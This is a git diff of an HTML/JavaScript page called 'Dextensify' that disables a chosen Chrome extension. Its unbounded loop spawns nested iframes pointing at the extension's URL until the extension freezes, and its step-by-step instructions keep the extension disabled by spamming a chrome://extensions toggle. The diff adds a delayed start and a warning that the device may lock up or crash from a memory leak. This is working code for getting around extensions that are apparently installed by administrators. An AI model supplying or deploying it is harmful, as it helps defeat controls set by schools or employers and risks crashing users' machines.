@@ -194,22 +194,32 @@
           let button = document.createElement("button");
           button.innerText = `Freeze ${extension.name}`;
           button.onclick = () => {
-            create_iframes(extension.url);
+            button_handler(extension);
           }
           buttons_container.append(button);
         }
       }
 
-      function create_iframes(public_url) {
+      function button_handler(extension) {
+        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
+        if (cancel) return;
+        
+        setTimeout(() => {
+          create_iframes(extension);
+        }, 5000);
+      }
+
+      function create_iframes(extension) {
         let iframes = []
         let iterations = 5;
+        let public_url = extension.url;
         
         while (true) {
           let iframe = document.createElement("iframe");
           document.body.append(iframe);
           iframes.push(iframe);
 
-          let subframe_count = Math.max(2, 200 - iterations);
+          //let subframe_count = Math.max(2, 200 - iterations);
           for (let i=0; i<50; i++) {
             let subframe = document.createElement("iframe");
             subframe.src = public_url;
@@ -237,7 +247,7 @@
       <ol>
         <li>Open chrome://extensions in a new tab. Keep this page open.</li>
         <li>Go to the settings page for the extension you want to disable.</li>
-        <li>On this page, click the "freeze extension" button.</li>
+        <li>On the Dextensify page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
         <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
         <li>The extension should now be temporarily disabled. For this effect to persist, flip the "allow access to file URLs" again every few minutes, or if pages start getting blocked again.</li>
         <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
@@ -272,7 +282,7 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.</pre>
-        <p style="font-size: 13px; text-align: right;"><i>Version 1.0.5</i></p>
+        <p style="font-size: 13px; text-align: right;"><i>Version 1.1.0</i></p>
       </details>
     </div>
   </body>
